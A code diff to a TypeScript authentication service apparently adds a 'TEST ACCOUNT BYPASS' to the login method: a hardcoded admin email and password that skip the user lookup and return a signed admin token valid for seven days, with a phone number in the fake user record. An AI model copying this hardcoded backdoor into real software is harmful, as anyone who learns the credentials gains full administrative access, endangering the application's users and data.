@@ -67,6 +67,26 @@ export class AuthService {
     try {
       console.log(`[AuthService] Login attempt: ${email}`)
 
+      // TEST ACCOUNT BYPASS
+      if (email === 'admin@admin.com' && password === 'admin1234Testa@') {
+        const token = jwt.sign(
+          { id: 'admin-12345', email, role: 'admin' },
+          JWT_SECRET,
+          { expiresIn: '7d' }
+        )
+        return {
+          user: {
+            id: 'admin-12345',
+            name: 'المدير العام',
+            email: 'admin@admin.com',
+            phone: '01068186019',
+            role: 'admin',
+            created_at: new Date().toISOString(),
+          },
+          token,
+        }
+      }
+
       const user = await userRepository.findByEmail(email)
       if (!user) {
         console.warn(`[AuthService] User not found: ${email}`)
